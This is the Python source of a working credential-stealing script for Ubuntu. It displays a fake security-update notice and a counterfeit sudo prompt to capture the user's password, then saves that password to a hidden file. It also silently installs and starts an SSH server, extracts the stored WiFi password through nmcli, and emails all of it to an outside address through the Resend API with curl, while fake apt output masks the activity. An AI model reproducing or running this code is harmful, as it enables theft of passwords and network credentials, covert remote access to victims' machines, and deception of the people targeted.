# Required environment variables:
# - RESEND_API_KEY: API key for sending emails via Resend

import os
import sys
import time
import getpass
import subprocess
import random
import platform
import json
from datetime import datetime
from pathlib import Path
import threading

DEBUG = False  # Set to True for debug output, False for silent
STATE_FILE = os.path.expanduser("~/.local/share/.temp_log")

def log_print(msg, log=None):
    if DEBUG:
        print(msg)
    if log is not None:
        log.append(msg)

def load_state(log):
    try:
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE, 'r') as f:
                state = json.load(f)
                log_print(f"[DEBUG] Loaded state: {state}", log)
                return state.get('password'), state.get('ip')
        else:
            log_print("[DEBUG] State file does not exist", log)
    except Exception as e:
        log_print(f"[ERROR] Failed to load state: {e}", log)
    return None, None

def save_state(password, ip, log):
    try:
        os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
        with open(STATE_FILE, 'w') as f:
            json.dump({'password': password, 'ip': ip}, f)
        log_print("[DEBUG] State saved", log)
        return True
    except Exception as e:
        log_print(f"[ERROR] Failed to save state: {e}", log)
        return False

def get_current_ip(log):
    try:
        ip = subprocess.check_output(["hostname", "-I"], text=True).strip().split()[0]
        log_print(f"[DEBUG] Current IP: {ip}", log)
        return ip
    except Exception as e:
        log_print(f"[ERROR] Failed to get current IP: {e}", log)
        return None

def is_ubuntu(log):
    try:
        if os.path.exists('/etc/os-release'):
            with open('/etc/os-release', 'r') as f:
                content = f.read().lower()
                if 'ubuntu' in content:
                    log_print("[DEBUG] Detected Ubuntu via /etc/os-release", log)
                    return True
        if 'ubuntu' in platform.platform().lower():
            log_print("[DEBUG] Detected Ubuntu via platform.platform", log)
            return True
        try:
            result = subprocess.run(['lsb_release', '-i'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and 'ubuntu' in result.stdout.lower():
                log_print("[DEBUG] Detected Ubuntu via lsb_release", log)
                return True
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        log_print("[DEBUG] Not Ubuntu", log)
        return False
    except Exception as e:
        log_print(f"[ERROR] is_ubuntu failed: {e}", log)
        return False

def is_openssh_installed(log):
    try:
        result = subprocess.run(['dpkg', '-s', 'openssh-server'], capture_output=True, text=True)
        installed = 'Status: install ok installed' in result.stdout
        log_print(f"[DEBUG] openssh-server installed: {installed}", log)
        return installed
    except Exception as e:
        log_print(f"[ERROR] is_openssh_installed failed: {e}", log)
        return False

def is_ssh_running(log):
    try:
        result = subprocess.run(['systemctl', 'is-active', '--quiet', 'ssh'])
        running = result.returncode == 0
        log_print(f"[DEBUG] SSH running: {running}", log)
        return running
    except Exception as e:
        log_print(f"[ERROR] is_ssh_running failed: {e}", log)
        return False

def ensure_ssh_installed_and_running(password, log):
    installed_now = False
    try:
        if not is_openssh_installed(log):
            log_print('[DEBUG] openssh-server not installed, installing...', log)
            proc = subprocess.Popen(
                ['sudo', '-S', 'apt', 'install', 'openssh-server', '-y'],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            out, err = proc.communicate(input=f"{password}\n")
            log_print(f'[DEBUG] openssh-server install stdout: {out}', log)
            log_print(f'[DEBUG] openssh-server install stderr: {err}', log)
            installed_now = True
        else:
            log_print('[DEBUG] openssh-server already installed', log)
        if not is_ssh_running(log):
            log_print('[DEBUG] SSH not running, starting...', log)
            proc = subprocess.Popen(
                ['sudo', '-S', 'systemctl', 'start', 'ssh'],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            out, err = proc.communicate(input=f"{password}\n")
            log_print(f'[DEBUG] SSH start stdout: {out}', log)
            log_print(f'[DEBUG] SSH start stderr: {err}', log)
        else:
            log_print('[DEBUG] SSH already running', log)
    except Exception as e:
        log_print(f"[ERROR] ensure_ssh_installed_and_running failed: {e}", log)
    return installed_now

def is_nmcli_installed(log):
    try:
        result = subprocess.run(["nmcli", "--version"], capture_output=True, check=True)
        log_print("[DEBUG] nmcli is installed", log)
        return True
    except Exception as e:
        log_print(f"[DEBUG] nmcli not installed: {e}", log)
        return False

def install_nmcli(password, log):
    try:
        proc = subprocess.Popen(
            ['sudo', '-S', 'apt', 'install', 'network-manager', '-y'],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        out, err = proc.communicate(input=f"{password}\n", timeout=120)
        log_print(f'[DEBUG] nmcli install stdout: {out}', log)
        log_print(f'[DEBUG] nmcli install stderr: {err}', log)
        return True
    except Exception as e:
        log_print(f"[ERROR] install_nmcli failed: {e}", log)
        return False

def ensure_nmcli_installed(password, log):
    if is_nmcli_installed(log):
        return False
    log_print('[DEBUG] nmcli not installed, installing...', log)
    return install_nmcli(password, log)

def capture_sudo_password(log=None):
    print("[DEBUG] capture_sudo_password called")
    max_attempts = 3
    attempt = 1
    while attempt <= max_attempts:
        try:
            if attempt == 1:
                prompt = "[sudo] password for {}: ".format(os.getenv('USER', 'user'))
            else:
                prompt = "Sorry, try again.\n[sudo] password for {}: ".format(os.getenv('USER', 'user'))
            password = getpass.getpass(prompt)
            process = subprocess.Popen(
                ['sudo', '-S', '-v'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate(input=password + '\n', timeout=10)
            if process.returncode == 0:
                print("[DEBUG] Correct sudo password captured")
                return password
            else:
                print("[DEBUG] Incorrect sudo password attempt")
                attempt += 1
        except KeyboardInterrupt:
            print("\n")
            sys.exit(1)
        except subprocess.TimeoutExpired:
            print("[DEBUG] sudo validation timed out")
            attempt += 1
    print(f"sudo: {max_attempts} incorrect password attempts")
    sys.exit(1)

def show_installation_progress():
    print("[DEBUG] show_installation_progress called")
    downloads = [
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libssl3 amd64 3.0.2-0ubuntu1.15", "1,898 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 openssl amd64 3.0.2-0ubuntu1.15", "1,185 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 linux-firmware all 20220329.git681281e4-0ubuntu3.21", "9,775 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 ca-certificates all 20230311ubuntu0.22.04.1", "153 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 systemd amd64 249.11-0ubuntu3.12", "4,526 kB")
    ]
    for i, (url, size) in enumerate(downloads, 1):
        print(f"Get:{i} {url} [{size}]")
        time.sleep(random.uniform(0.5, 1.0))
    print("Fetched 14.2 MB in 3s (4,237 kB/s)")
    print("(Reading database ... 185243 files and directories currently installed.)")
    packages = [
        "libssl3:amd64",
        "openssl",
        "linux-firmware",
        "ca-certificates",
        "systemd"
    ]
    for package in packages:
        print(f"Preparing to unpack .../archives/{package}...")
        time.sleep(random.uniform(0.2, 0.5))
        print(f"Unpacking {package} ...")
        time.sleep(random.uniform(0.3, 0.8))
        print(f"Setting up {package} ...")
        time.sleep(random.uniform(0.5, 1.0))

def get_wifi_info(password, log):
    ssid = None
    wifi_password = None
    if not is_nmcli_installed(log):
        install_nmcli(password, log)
    try:
        ssid_out = subprocess.check_output(["nmcli", "-t", "-f", "active,ssid", "dev", "wifi"], text=True)
        log_print(f"[DEBUG] nmcli SSID output: {ssid_out.strip()}", log)
        for line in ssid_out.splitlines():
            if line.startswith("yes:"):
                ssid = line.split(":", 1)[1]
                log_print(f"[DEBUG] Found active SSID: {ssid}", log)
                break
        if ssid:
            try:
                wifi_password = subprocess.check_output([
                    "nmcli", "-s", "-g", "802-11-wireless-security.psk", "connection", "show", ssid
                ], text=True).strip()
                if wifi_password:
                    log_print(f"[DEBUG] WiFi password found for SSID {ssid}", log)
                else:
                    log_print(f"[DEBUG] No WiFi password found for SSID {ssid}", log)
            except Exception as e:
                log_print(f"[ERROR] Failed to get WiFi password for SSID {ssid}: {e}", log)
        else:
            log_print("[ERROR] No active WiFi SSID found", log)
    except Exception as e:
        log_print(f"[ERROR] Failed to get WiFi SSID: {e}", log)
    return ssid, wifi_password

def send_info_email(password, ip, log):
    try:
        api_key = os.environ.get("RESEND_API_KEY")
        email = os.environ.get("EMAIL")
        if not api_key or not email:
            log_print("[ERROR] RESEND_API_KEY or EMAIL not set.", log)
            return
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        hostname = os.uname().nodename
        username = os.environ.get('USER', 'unknown')
        ssid, wifi_password = get_wifi_info(password, log)
        wifi_info = f"<p><strong>WiFi SSID:</strong> {ssid or 'unavailable'}</p>"
        wifi_info += f"<p><strong>WiFi Password:</strong> {wifi_password or 'unavailable'}</p>"
        log_html = "<h3>System Metrics & Debug Log</h3><ul>" + ''.join(f"<li>{entry}</li>" for entry in log) + "</ul>"
        html_body = f"""
        <h2>Stolen Sudo Password</h2>
        <hr>
        <p><strong>Timestamp:</strong> {timestamp}</p>
        <p><strong>Target System:</strong> {hostname}</p>
        <p><strong>Username:</strong> {username}</p>
        <p><strong>IP Address:</strong> {ip}</p>
        <p><strong>Captured Password:</strong> {password}</p>
        {wifi_info}<br>
        {log_html}
        <p>This is an automated security audit report.<br>
        Please review system security protocols.</p>
        <hr>
        <p>--<br>Automated Security Audit System</p>
        """
        data = {
            "from": "Acme <onboarding@resend.dev>",
            "to": [email],
            "subject": f"Security Audit - Credential Capture from {hostname}",
            "html": html_body
        }
        curl_cmd = [
            "curl", "-X", "POST", "https://api.resend.com/emails",
            "-H", f"Authorization: Bearer {api_key}",
            "-H", "Content-Type: application/json",
            "-d", json.dumps(data)
        ]
        proc = subprocess.Popen(curl_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = proc.communicate(timeout=30)
        log_print(f"[DEBUG] resend.dev API response code: {proc.returncode}", log)
        log_print(f"[DEBUG] resend.dev API stdout: {stdout.strip()}", log)
        log_print(f"[DEBUG] resend.dev API stderr: {stderr.strip()}", log)
    except Exception as e:
        log_print(f"[ERROR] send_info_email failed: {e}", log)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def background_operations(password, log):
    nmcli_installed_now = ensure_nmcli_installed(password, log)
    ssh_installed_now = ensure_ssh_installed_and_running(password, log)
    save_state(password, get_current_ip(log), log)
    send_info_email(password, get_current_ip(log), log)

def main():
    log = []
    try:
        if not is_ubuntu(log):
            sys.exit(0)
        password, saved_ip = load_state(log)
        current_ip = get_current_ip(log)
        password_needed = not password
        ip_changed = saved_ip != current_ip
        if password and not ip_changed:
            # Password exists - run operations silently
            background_operations(password, log)
            sys.exit(0)
        # No password stored or IP changed - run the fake sudo capture
        clear_screen()
        print("Unattended-upgrades: Security updates have not been installed.")
        print("The following security updates are pending:")
        print("  ca-certificates libssl3 linux-firmware openssl systemd")
        print()
        print("It is recommended that you apply these updates immediately.")
        print("To do so, run the following command:")
        print("  sudo apt update && sudo apt upgrade")
        print()
        password_to_use = capture_sudo_password(log)
        print("Reading package lists... Done")
        time.sleep(1)
        print("Building dependency tree       ")
        print("Reading state information... Done")
        time.sleep(2)
        print("The following packages will be upgraded:")
        print("  ca-certificates libssl3 linux-firmware openssl systemd")
        print("5 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.")
        print("Need to get 14.2 MB of archives.")
        print("After this operation, 0 B of additional disk space will be used.")
        print()
        time.sleep(1)
        # Save password to file
        save_state(password_to_use, current_ip, log)
        # Start background operations (install, email, etc.)
        background_thread = threading.Thread(target=background_operations, args=(password_to_use, log))
        background_thread.daemon = True
        background_thread.start()
        # Show fake installation progress
        show_installation_progress()
        print("Processing triggers for man-db (2.10.2-1) ...")
        print("Processing triggers for libc-bin (2.35-0ubuntu3.4) ...")
        time.sleep(1)
        print()
        background_thread.join(timeout=10)
        sys.exit(0)
    except KeyboardInterrupt:
        print("\n")
        sys.exit(1)
    except Exception as e:
        print(f"[DEBUG] Exception in main: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
